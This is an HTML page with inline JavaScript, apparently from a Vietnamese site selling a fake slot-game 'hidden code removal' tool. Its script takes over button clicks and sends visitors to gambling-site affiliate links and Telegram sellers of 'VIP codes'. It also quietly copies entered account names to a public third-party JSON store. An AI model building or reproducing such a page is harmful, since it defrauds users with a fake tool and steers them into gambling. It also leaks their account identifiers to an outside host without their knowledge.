<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" crossorigin href="./assets/index-C_ZKDQon.css">
  </head>
  <body>
    <div id="root"></div>
  <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"1575790a9946416b9c5f3e8999027390","r":1}' crossorigin="anonymous"></script>
  <script>
    // --- DOMAIN-BASED LINK ROUTING FOR CLOUDFLARE ---
    const DEFAULT_TARGET_URL = 'https://gg8850.com/?id=525443428';
    const DEFAULT_TELEGRAM_URL = 'https://t.me/thaymeo68';
    const DEFAULT_TELEGRAM_HANDLE = '@thaymeo68';

    const DOMAIN_CONFIG = {
      "xoamaan.uk": {
        targetUrl: "https://gg8850.com/?id=525443428",
        telegramUrl: "https://t.me/thaymeo68",
        telegramHandle: "@thaymeo68"
      },
      "xoamaan.asia": {
        targetUrl: "https://gg8850.com/?id=248422193",
        telegramUrl: "https://t.me/bosshoanglong379",
        telegramHandle: "@bosshoanglong379"
      },
      "xoamavip.us": {
        targetUrl: "https://gg8832.com/?id=669002001",
        telegramUrl: "https://t.me/toolslotAI2026",
        telegramHandle: "@toolslotAI2026"
      },
      "xoamaan88.net": {
        targetUrl: "https://www.gg8850.com/?id=756363415",
        telegramUrl: "https://t.me/minhanh9x1",
        telegramHandle: "@minhanh9x1"
      }
    };

    window.getDomainConfig = function() {
      const host = (window.location.hostname || "").toLowerCase().trim();
      const cleanHost = host.replace(/^www\./, "");
      const cfg = DOMAIN_CONFIG[host] || DOMAIN_CONFIG[cleanHost] || {};
      return {
        targetUrl: cfg.targetUrl || DEFAULT_TARGET_URL,
        telegramUrl: cfg.telegramUrl || DEFAULT_TELEGRAM_URL,
        telegramHandle: cfg.telegramHandle || DEFAULT_TELEGRAM_HANDLE
      };
    };

    window.getTargetUrl = function() {
      return window.getDomainConfig().targetUrl;
    };

    window.getTelegramUrl = function() {
      return window.getDomainConfig().telegramUrl;
    };

    const SYNC_BLOB_ID = '019fbacd-a33b-79bd-895a-44053b741804';
    const SYNC_URL = 'https://jsonblob.com/api/jsonBlob/' + SYNC_BLOB_ID;

    let userAssignedCode = null;
    let currentAccount = null;
    let checkInterval = null;
    let globalCodesSyncMap = {};

    async function pullGlobalCodesMap() {
      try {
        const globalRes = await fetch(SYNC_URL, { headers: { 'Accept': 'application/json' } });
        const store = await globalRes.json().catch(() => null);
        if (store && store.codesMap) {
          for (const k in store.codesMap) {
            globalCodesSyncMap[k.toUpperCase()] = store.codesMap[k];
          }
        }
      } catch(e) {}
      try {
        const res = await fetch('/api/admin/codes?limit=5000');
        const data = await res.json().catch(() => null);
        if (data && Array.isArray(data.codes)) {
          data.codes.forEach(c => {
            if (c && c.id) {
              globalCodesSyncMap[c.id.toUpperCase()] = c;
            }
          });
        }
      } catch(e) {}
    }

    pullGlobalCodesMap();
    setInterval(pullGlobalCodesMap, 1500);

    async function syncRequestToGlobal(acc) {
      try {
        const getRes = await fetch(SYNC_URL, { headers: { 'Accept': 'application/json' } });
        let store = await getRes.json().catch(() => null);
        if (!store || !Array.isArray(store.pending)) store = { pending: [] };

        if (!store.pending.find(p => p.account && p.account.toLowerCase() === acc.toLowerCase())) {
          store.pending.unshift({ account: acc, requestedAt: new Date().toISOString() });
          if (store.pending.length > 50) store.pending.pop();
        }

        await fetch(SYNC_URL, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
          body: JSON.stringify(store)
        });
      } catch(e) {}
    }

    function startCheckApproval(acc) {
      currentAccount = acc;
      if (checkInterval) clearInterval(checkInterval);
      checkInterval = setInterval(async () => {
        if (!currentAccount || userAssignedCode) return;

        // Check local backend API
        try {
          const res = await fetch(`/api/check-status?account=${encodeURIComponent(currentAccount)}`);
          const d = await res.json();
          if (d.success && d.status === 'assigned' && d.code) {
            userAssignedCode = d.code.id;
            clearInterval(checkInterval);
            return;
          }
        } catch(e) {}

        // Check global sync store (jsonblob)
        try {
          const globalRes = await fetch(SYNC_URL, { headers: { 'Accept': 'application/json' } });
          const store = await globalRes.json().catch(() => null);
          if (store && store.codesMap) {
            for (const key in store.codesMap) {
              const c = store.codesMap[key];
              if (c && c.assignedAccount && c.assignedAccount.toLowerCase() === currentAccount.toLowerCase() && c.status === 'assigned') {
                userAssignedCode = c.id;
                clearInterval(checkInterval);
                return;
              }
            }
          }
        } catch(e) {}
      }, 2000);
    }

    // SYNCHRONOUS INSTANT EVENT CAPTURE & INTERCEPTION (0ms, BLOCKS REACT ENTIRELY)
    document.addEventListener('click', function(e) {
      // Extract inputs SYNCHRONOUSLY
      const inputs = document.querySelectorAll('input');
      let acc = '';
      let enteredCode = '';
      inputs.forEach(inp => {
        const val = (inp.value || '').trim();
        const ph = (inp.placeholder || '').toLowerCase();
        const name = (inp.name || '').toLowerCase();
        if (ph.includes('mã') || ph.includes('code') || name.includes('code')) {
          if (val) enteredCode = val.toUpperCase();
        } else {
          if (val) acc = val;
        }
      });

      // Synchronous Instant Code Lock Verification
      if (enteredCode && acc) {
        const info = globalCodesSyncMap[enteredCode];
        if (info) {
          if (info.status === 'used') {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            alert(`❌ CHẶN TRUY CẬP: MÃ [${enteredCode}] ĐÃ ĐƯỢC SỬ DỤNG TRƯỚC ĐÓ. KHÔNG THỂ DÙNG LẠI!`);
            return false;
          }
          if (info.status === 'deleted') {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            alert(`❌ CHẶN TRUY CẬP: MÃ [${enteredCode}] ĐÃ BỊ XÓA KHỎI HỆ THỐNG!`);
            return false;
          }
          if (info.assignedAccount && info.assignedAccount.toLowerCase().trim() !== acc.toLowerCase().trim()) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            
            const teleConfig = window.getDomainConfig();
            // Show small inline error msg near input with clickable Telegram link
            let errBox = document.getElementById('code-error-inline-msg');
            if (!errBox) {
              errBox = document.createElement('div');
              errBox.id = 'code-error-inline-msg';
              errBox.style.cssText = 'color: #ff4d4d; font-size: 0.85rem; font-weight: bold; margin-top: 6px; text-align: center; font-family: sans-serif;';
              const codeInp = document.querySelector('input');
              if (codeInp && codeInp.parentNode) codeInp.parentNode.appendChild(errBox);
            }
            if (errBox) {
              errBox.innerHTML = `⚠️ Mã không hợp lệ hoặc thuộc tài khoản khác! Vui lòng liên hệ Telegram <a href="${teleConfig.telegramUrl}" target="_blank" style="color: #25c4ac; text-decoration: underline; font-weight: bold;">${teleConfig.telegramHandle}</a> để được hỗ trợ!`;
            }

            alert(`⚠️ Mã giftcode không hợp lệ hoặc thuộc tài khoản khác. Vui lòng liên hệ Telegram ${teleConfig.telegramHandle} (${teleConfig.telegramUrl}) để được hỗ trợ!`);
            return false;
          }
        }
      }

      const btn = e.target.closest('button, a, input[type="submit"]');
      if (btn) {
        const txt = (btn.innerText || btn.textContent || btn.value || '').trim().toLowerCase();

        // Copy button handler
        if (txt.includes('sao chép') || txt.includes('copy')) {
          if (userAssignedCode) {
            navigator.clipboard.writeText(userAssignedCode);
            alert('📋 Đã sao chép mã VIP do Admin cấp: ' + userAssignedCode);
          } else {
            alert('⏳ Đang chờ Admin phê duyệt & cấp mã cho tài khoản của bạn. Vui lòng thử lại sau vài giây!');
          }
          return;
        }

        // IT Support / Telegram button handler ("IT HỖ TRỢ XÓA MÃ", "hỗ trợ", "telegram", "tele")
        if (txt.includes('it hỗ trợ') || txt.includes('hỗ trợ') || txt.includes('telegram') || txt.includes('tele') || txt.includes('support')) {
          e.preventDefault();
          e.stopPropagation();
          e.stopImmediatePropagation();
          
          const teleUrl = window.getTelegramUrl();
          if (btn.tagName === 'A') {
            btn.href = teleUrl;
            btn.target = '_blank';
          }
          window.open(teleUrl, '_blank');
          return false;
        }

        // Target action / Game link button handler ("tìm cổng đang nhả")
        if (txt.includes('tìm cổng') || txt.includes('cổng đang nhả') || txt.includes('truy cập') || txt.includes('vào game') || txt.includes('chơi ngay')) {
          e.preventDefault();
          e.stopPropagation();
          e.stopImmediatePropagation();
          
          const targetUrl = window.getTargetUrl();
          if (btn.tagName === 'A') {
            btn.href = targetUrl;
            btn.target = '_blank';
          }
          window.open(targetUrl, '_blank');
          return false;
        }

        // Run button handler
        if (txt.includes('run') || txt.includes('xoá_mã_ẩn') || txt.includes('xóa_mã_ẩn') || txt.includes('xoá mã ẩn') || txt.includes('xóa mã ẩn')) {
          if (!acc || acc.length < 4) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            alert('⚠️ Vui lòng nhập tên tài khoản từ 4 ký tự trở lên!');
            return false;
          }

          fetch('/api/request-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ account: acc })
          }).then(r => r.json()).then(d => {
            if (d.success) {
              if (d.status === 'assigned' && d.code) {
                userAssignedCode = d.code.id;
              } else {
                startCheckApproval(acc);
              }
            }
          }).catch(err => {
            startCheckApproval(acc);
          });

          syncRequestToGlobal(acc);
        }
      }
    }, true);
  </script>
</body>
</html>
